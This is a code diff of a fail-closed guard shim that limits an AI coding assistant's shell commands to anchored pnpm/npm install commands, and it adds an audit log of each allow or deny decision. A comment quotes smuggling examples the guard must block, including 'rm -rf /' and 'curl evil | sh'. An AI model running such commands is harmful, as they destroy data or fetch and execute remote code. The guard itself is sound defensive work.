@@ -22,16 +22,29 @@ export function shimPath(projectRoot: string): string {
 // self-heal the guards (run `pnpm install`) when node_modules is absent — otherwise the guard blocks
 // the very command that re-enables it (deadlock). nx/pnpm monorepo only. POSIX ERE (fed to `grep -E`).
 //
-// Base command + `--flags` only. Because nothing but `--word` tokens may follow `install`, shell
-// operators (`;`, `&&`, `|`, backticks, `$()`, `>`, `<`) cannot match — so nothing can be smuggled
-// alongside the install. Keep in sync with INSTALLER_ALLOW_JS below (locked by a unit test).
+// What's allowed (the realistic self-heal spellings — an earlier version only matched a bare
+// `pnpm install`, so `pnpm i` and `--flag=value` got fail-CLOSED and re-deadlocked the assistant):
+//   - pkg managers: pnpm | npm   (this nx monorepo uses pnpm; npm is accepted as the fallback. NOT
+//                                 yarn — this repo installs with pnpm/npm only, so yarn stays denied.)
+//   - subcommands:  install | i  (`pnpm i` / `npm i` is just shorthand for `install`)
+//   - flags:        zero or more `--flag` / `--flag=value` tokens (no whitespace, no operators)
+//
+// No `cd` prefix on purpose: the root package.json IS the install target in this nx monorepo and
+// Claude Code starts at the repo root, so a bare `pnpm install` always works — no `cd` is ever needed,
+// and allowing one would only widen the attack surface of a fail-CLOSED escape hatch.
+//
+// Why it's un-smuggleable (the whole point of failing closed): the tail is anchored to `$` and only
+// accepts `--word` tokens, so no shell operator (`;`, `&&`, `|`, backticks, `$()`, `>`, `<`) can ride
+// along — `pnpm install && rm -rf /` and `pnpm install; curl evil | sh` still FAIL CLOSED.
+// Keep in sync with INSTALLER_ALLOW_JS below (locked by a unit test).
 export const INSTALLER_ALLOW_ERE =
-    '^(pnpm|npm) install([[:space:]]+--[A-Za-z][A-Za-z-]*)*[[:space:]]*$';
+    '^(pnpm|npm)[[:space:]]+(install|i)([[:space:]]+--[A-Za-z][A-Za-z0-9=._/@:-]*)*[[:space:]]*$';
 
 // JS-regex twin of INSTALLER_ALLOW_ERE (POSIX `[[:space:]]` → `\s`). Not used by the fail-closed
 // shim (which is pure sh), but kept as the single JS-side definition should a future guard ever need
 // to recognise installer commands in the runner. A unit test asserts the two agree on a sample set.
-export const INSTALLER_ALLOW_JS = /^(pnpm|npm) install(\s+--[A-Za-z][A-Za-z-]*)*\s*$/;
+export const INSTALLER_ALLOW_JS =
+    /^(pnpm|npm)\s+(install|i)(\s+--[A-Za-z][A-Za-z0-9=._/@:-]*)*\s*$/;
 
 // Normal template literal (not String.raw): it carries #235's shell escapes verbatim (\${BIN_NAME},
 // \$REASON, \\n for the deny JSON) AND my sed backslashes (doubled: \\(, \\), \\1, [^"\\\\]). The
@@ -61,9 +74,20 @@ fi
 PAYLOAD="$(cat)"
 CMD="$(printf '%s' "$PAYLOAD" | sed -n 's/.*"command"[[:space:]]*:[[:space:]]*"\\([^"\\\\]*\\)".*/\\1/p')"
 TOOL="$(printf '%s' "$PAYLOAD" | sed -n 's/.*"tool_name"[[:space:]]*:[[:space:]]*"\\([^"\\\\]*\\)".*/\\1/p')"
+# Best-effort audit trail of every decision the fail-closed shim makes WHILE THE GUARDS ARE DOWN, so a
+# human can inspect after something odd (an install that was denied, or one that slipped through). One
+# tab-separated line per call → <root>/.webpieces/logs/ai-hook-shim.log (gitignored). NEVER breaks or
+# blocks the hook: all writes are best-effort (|| true) and go to a file, never to stdout (stdout is
+# the PreToolUse decision channel — a stray byte there would corrupt allow/deny).
+LOG_DIR="$ROOT/.webpieces/logs"
+wp_log() {                   # $1 = decision label (ALLOW-INSTALL | DENY)
+  { mkdir -p "$LOG_DIR" 2>/dev/null && printf '%s\\t%s\\t%s\\t%s\\t%s\\n' "$(date '+%Y-%m-%dT%H:%M:%S%z' 2>/dev/null)" "$BIN_NAME" "$TOOL" "$1" "$CMD" >> "$LOG_DIR/ai-hook-shim.log"; } 2>/dev/null || true
+}
 if printf '%s' "$CMD" | grep -Eq '${INSTALLER_ALLOW_ERE}'; then
+  wp_log ALLOW-INSTALL       # record the self-heal we let through
   exit 0                     # allow the installer so the assistant can self-heal the deadlock
 fi
+wp_log DENY                  # record every fail-closed block for later inspection
 # Not an installer command → FAIL CLOSED. Deny via Claude Code's PreToolUse JSON protocol
 # (permissionDecision "deny" on stdout, then exit 0) rather than a bare "exit 2". BOTH block the call,
 # but the reason must be made visible, and HOW depends on the tool (verified by live tests; the docs
